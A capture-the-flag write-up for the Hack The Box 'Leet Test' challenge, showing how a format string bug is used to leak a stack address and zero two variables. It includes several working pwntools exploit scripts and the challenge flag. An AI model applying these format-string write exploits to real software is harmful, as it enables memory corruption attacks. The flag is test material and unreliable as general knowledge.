# Leet Test
> Write-up author: jon-brandy

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/ba3ff1f7-a019-4056-ad99-314378f662ca)

## Lessons Learned:
1. Exploiting FSB.
2. Overwriting global and local variable to 0.

## DESCRIPTION:
Are you 1337 enough?

## STEPS:
1. In this challenge we're given a 64 bit binary, dynamically linked, and not stripped.

```
┌──(brandy㉿bread-yolk)-[~/Downloads/leet_test]
└─$ file leet_test 
leet_test: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=c6e69bc8fc90c94520adb2fc11a0d7d7b85326f6, for GNU/Linux 3.2.0, not stripped
```

> BINARY PROTECTIONS

```
┌──(brandy㉿bread-yolk)-[~/Downloads/leet_test]
└─$ pwn checksec leet_test                              
[*] '/home/brandy/Downloads/leet_test/leet_test'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```


2. After decompiled the binary, seems the concept here is overwriting stack variable using format strings vulnerability.
3. It's proven by no potential BOF but there is format strings vuln.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/6656022e-a408-4e6e-af3b-f7873e468318)


4. Analyzing the main functions, we know that we can overwrite 2 variables there, the `local_13c` which held the random values.
5. And `winner` variable which held the 0xcafebabe value.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/dd203988-b454-4106-b115-ae41377c0d5c)


6. We can just overwrite them as 0, so it would be look like this:

```
0 * 0x1337c0de == 0
```

7. With this, when we run the binary, it will break out of the while loop then cat the flag for us.
8. Great! Here's what we need to do:

```
- Get the fmtstr offset.
- Calculate the exact address for the variable that held the random value.
- grab the address for winner.
```


### GET THE FORMAT STRING OFFSET

- To grab the format string offset, i used the template from pwnlib documentation and modified it.

> OUR SCRIPT

```py
from pwn import * 
import os 
os.system('clear')

def start(argv=[],  *a, **kw):
    if args.REMOTE:
        return remote(sys.argv[1], sys.argv[2],  *a, **kw)
    elif args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript ='''
init-pwndbg
continue
'''.format(**locals())

exe = './leet_test'
elf = context.binary = ELF(exe, checksec=True)
context.log_level = 'DEBUG'

def payload(exp):
    sh.sendline(exp)
    sh.recvuntil(b'Hello,')
    return sh.recvline().strip()

sh = start()
#pause()
format_str = FmtStr(execute_fmt=payload)
log.success('Format strings offset : %d', format_str.offset)

sh.interactive()
```

> RESULT --> offset at 10

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/40a3d2d6-8bcb-4d55-ada0-5f9dbcf2aee8)


- Let's calc the address for the random value.

#### NOTES: When i tried to solve this challenge remotely, the offset at the remote server is different, beauty of PWN 😭. So i'm gonna show you how to solve both locally and remotely.

> CALC THE ADDRESS LOCALLY

- After grab and calculate every stack address i leaked, the correct one is at 18 (mine locally).

> USE GDBSCRIPT TO BREAK AT 0x00000000004013a7

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/ee4ecec7-d600-4a73-b29e-aa96f8b10808)


> CALC SCRIPT

```py
from pwn import * 
import os 
os.system('clear')

def start(argv=[],  *a, **kw):
    if args.REMOTE:
        return remote(sys.argv[1], sys.argv[2],  *a, **kw)
    elif args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript ='''
init-pwndbg
break * 0x00000000004013a7
continue
'''.format(**locals())

exe = './leet_test'
elf = context.binary = ELF(exe, checksec=True)
context.log_level = 'DEBUG'

def payload(exp):
    sh.sendline(exp)
    sh.recvuntil(b'Hello,')
    return sh.recvline().strip()

sh = start()
#pause()
format_str = FmtStr(execute_fmt=payload)
log.success('Format strings offset : %d', format_str.offset)

sh.sendlineafter(b':', '%{}$p'.format(18))
sh.recvuntil(b'Hello,')
get = sh.recvline().strip()
#print(get)
get_addr = int(get, 16)
log.success('LEAKED STACK ADDRESS --> %#0x', get_addr)

calc = get_addr - 272
log.success('CALCULATED --> %#0x', calc)

sh.interactive()
```

- Notice our RAX held the random value.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/64d8749f-a355-4ff3-b8fc-0e7064764e0d)


- And we have the same address as the random value variable.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/89329073-fa0d-4ea5-b026-17569432cd8c)


9. Now we just need to grab the `winner` address.

> RESULT --> 0x404078
 
![image](https://github.com/jon-brandy/hackthebox/assets/70703371/90bebb50-8652-41cf-b246-d556ae8837b2)


10. Here's the final script.

```py
from pwn import * 
import os 
os.system('clear')

def start(argv=[],  *a, **kw):
    if args.REMOTE:
        return remote(sys.argv[1], sys.argv[2],  *a, **kw)
    elif args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript ='''
init-pwndbg
break * 0x00000000004013a7
continue
'''.format(**locals())

exe = './leet_test'
elf = context.binary = ELF(exe, checksec=True)
context.log_level = 'DEBUG'

def payload(exp):
    sh.sendline(exp)
    sh.recvuntil(b'Hello,')
    return sh.recvline().strip()

sh = start()
#pause()
format_str = FmtStr(execute_fmt=payload) # get fmtstr offset
log.success('Format strings offset : %d', format_str.offset)

sh.sendlineafter(b':', '%{}$p'.format(18))
sh.recvuntil(b'Hello,')
get = sh.recvline().strip()
#print(get)
get_addr = int(get, 16)
log.success('LEAKED STACK ADDRESS --> %#0x', get_addr)

# CALC THE RANDOM VALUE ADDRESS
calc = get_addr - 272
log.success('CALCULATED --> %#0x', calc)

## perform writes
format_str.write(calc, 0) # set to 0
format_str.write(0x404078, 0) # set to 0 
format_str.execute_writes()

sh.interactive()
```

> RESULT LOCALLY

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/114d7ee4-0b83-4d85-9cd7-cb4e3fd569a3)


11. Got our fake flag! But like what i said before, the remote server has different offset for the random value address 💀. So took me a while to solve this, here's the remote script.

> SCRIPT REMOTE

```py
from pwn import * 
import os 
os.system('clear')

def start(argv=[],  *a, **kw):
    if args.REMOTE:
        return remote(sys.argv[1], sys.argv[2],  *a, **kw)
    elif args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript ='''
init-pwndbg
break * 0x00000000004013a7
continue
'''.format(**locals())

exe = './leet_test'
elf = context.binary = ELF(exe, checksec=True)
context.log_level = 'DEBUG'

def payload(exp):
    sh.sendline(exp)
    sh.recvuntil(b'Hello,')
    return sh.recvline().strip()

sh = start()
#pause()
format_str = FmtStr(execute_fmt=payload) # get fmtstr offset
log.success('Format strings offset : %d', format_str.offset)

sh.sendlineafter(b':', '%{}$p'.format(38))
sh.recvuntil(b'Hello,')
get = sh.recvline().strip()
#print(get)
get_addr = int(get, 16)
log.success('LEAKED STACK ADDRESS --> %#0x', get_addr)

# CALC THE RANDOM VALUE ADDRESS
calc = get_addr - 287
log.success('CALCULATED --> %#0x', calc)

## perform writes
format_str.write(calc, 0) # set to 0
format_str.write(0x404078, 0) # set to 0 
format_str.execute_writes()

sh.interactive()
```

> RESULT

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/d3b202f3-a30a-4a17-84e4-1fca6f8b4d0f)

12. Got the flag!

#### NOTES: If it failed locally or remotely, try to run the script again, it happens because stack address are not static. Because ASLR is on.


## FLAG

```
HTB{y0u_sur3_r_1337_en0ugh!!}
```


